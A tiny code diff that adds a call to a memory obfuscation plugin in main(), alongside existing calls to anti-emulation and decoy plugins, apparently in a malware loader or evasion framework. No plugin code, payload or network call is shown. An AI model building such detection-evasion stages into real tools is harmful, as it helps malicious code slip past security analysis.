@@ -37,6 +37,9 @@ int main()
 	// Call: Anti Emulation plugin
 	antiemulation();
 
+	// Call: Memory Obfuscation plugin
+        memoryobfuscation();
+
 	// Call: Decoy plugin
 	decoy();
 
